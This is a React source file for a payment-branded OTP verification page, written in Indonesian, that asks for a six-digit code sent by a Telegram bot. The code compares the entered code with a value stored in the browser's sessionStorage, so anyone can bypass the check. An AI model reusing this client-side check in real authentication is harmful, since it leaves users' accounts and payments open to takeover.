import { useState, useRef, useEffect } from "react";
import { useLocation } from "wouter";
import { AuthHeader } from "@/components/auth-header";
import { RecaptchaBadge } from "@/components/recaptcha-badge";

export default function BotOtp() {
  const [, navigate] = useLocation();
  const [digits, setDigits] = useState(["", "", "", "", "", ""]);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    const code = sessionStorage.getItem("botOtpCode");
    if (!code) navigate("/login");
    else inputRefs.current[0]?.focus();
  }, [navigate]);

  const handleDigitChange = (idx: number, val: string) => {
    const char = val.replace(/\D/g, "").slice(-1);
    const next = [...digits];
    next[idx] = char;
    setDigits(next);
    if (char && idx < 5) inputRefs.current[idx + 1]?.focus();
  };

  const handleKeyDown = (idx: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace") {
      if (digits[idx]) {
        const next = [...digits];
        next[idx] = "";
        setDigits(next);
      } else if (idx > 0) {
        inputRefs.current[idx - 1]?.focus();
      }
    } else if (e.key === "ArrowLeft" && idx > 0) {
      inputRefs.current[idx - 1]?.focus();
    } else if (e.key === "ArrowRight" && idx < 5) {
      inputRefs.current[idx + 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (pasted.length === 6) {
      setDigits(pasted.split(""));
      inputRefs.current[5]?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    const entered = digits.join("");
    if (entered.length < 6) { setError("Masukkan 6 digit kode OTP."); return; }

    setLoading(true);
    const stored = sessionStorage.getItem("botOtpCode");

    if (entered === stored) {
      sessionStorage.removeItem("botOtpCode");
      navigate("/verify");
    } else {
      setError("Kode OTP salah. Periksa kembali pesan dari bot.");
      setDigits(["", "", "", "", "", ""]);
      inputRefs.current[0]?.focus();
    }
    setLoading(false);
  };

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center botp-outer"
      style={{ background: "#f7f7f7" }}
    >
      <style>{`
        @media (max-width: 520px) {
          .botp-outer {
            background: #fff !important;
            justify-content: flex-start !important;
            padding: 0 !important;
          }
          .botp-card {
            max-width: 100% !important;
            min-height: 100dvh !important;
            box-shadow: none !important;
            border-radius: 0 !important;
          }
          .botp-footer { display: none !important; }
        }
      `}</style>

      <div
        className="botp-card"
        style={{
          background: "#fff",
          borderRadius: 4,
          boxShadow: "0 2px 24px rgba(0,0,0,0.10)",
          width: "100%",
          maxWidth: 440,
          overflow: "hidden",
        }}
      >
        <AuthHeader />

        <div style={{ padding: "36px 36px 28px" }}>
          <div style={{ textAlign: "center", marginBottom: 28 }}>
            <div style={{
              width: 52, height: 52, borderRadius: "50%",
              background: "#f0f4ff", display: "flex",
              alignItems: "center", justifyContent: "center",
              margin: "0 auto 16px",
            }}>
              <span style={{ fontSize: 24 }}>🤖</span>
            </div>
            <h2 style={{ fontSize: 18, fontWeight: 700, color: "#111", marginBottom: 8 }}>
              Verifikasi OTP Bot
            </h2>
            <p style={{ fontSize: 13, color: "#666", lineHeight: 1.6 }}>
              Masukkan kode OTP 6 digit yang dikirim oleh <strong>@Mycrewpaybot</strong> ke Telegram kamu.
            </p>
          </div>

          <form onSubmit={handleSubmit}>
            <div style={{ display: "flex", gap: 8, justifyContent: "center", marginBottom: 24 }}>
              {digits.map((d, i) => (
                <input
                  key={i}
                  ref={(el) => { inputRefs.current[i] = el; }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  value={d}
                  onChange={(e) => handleDigitChange(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  onPaste={i === 0 ? handlePaste : undefined}
                  style={{
                    width: 46, height: 54,
                    textAlign: "center",
                    fontSize: 22, fontWeight: 700,
                    border: `2px solid ${error ? "#ef4444" : d ? "#111" : "#ddd"}`,
                    borderRadius: 6,
                    outline: "none",
                    color: "#111",
                    background: "#fff",
                    transition: "border-color 0.15s",
                  }}
                  onFocus={(e) => { if (!error) e.target.style.borderColor = "#111"; }}
                  onBlur={(e) => { if (!digits[i]) e.target.style.borderColor = "#ddd"; }}
                />
              ))}
            </div>

            {error && (
              <p style={{ color: "#ef4444", fontSize: 12, textAlign: "center", marginBottom: 16 }}>
                {error}
              </p>
            )}

            <button
              type="submit"
              disabled={loading || digits.join("").length < 6}
              style={{
                width: "100%", padding: "13px 0",
                background: digits.join("").length === 6 ? "#111" : "#ccc",
                color: "#fff", border: "none", borderRadius: 4,
                fontSize: 14, fontWeight: 600, cursor: digits.join("").length === 6 ? "pointer" : "not-allowed",
                transition: "background 0.2s",
              }}
            >
              {loading ? "Memverifikasi..." : "Verifikasi"}
            </button>
          </form>

          <p style={{ textAlign: "center", fontSize: 12, color: "#999", marginTop: 20 }}>
            Belum menerima kode?{" "}
            <button
              type="button"
              onClick={() => navigate("/login")}
              style={{ color: "#111", fontWeight: 600, background: "none", border: "none", cursor: "pointer", fontSize: 12 }}
            >
              Kembali ke Login
            </button>
          </p>
        </div>

        <RecaptchaBadge />
      </div>

      <p className="botp-footer" style={{ fontSize: 11, color: "#aaa", marginTop: 20, textAlign: "center" }}>
        &copy; MyPaymentVault | Terms of Use | Privacy &amp; Cookies
      </p>
    </div>
  );
}
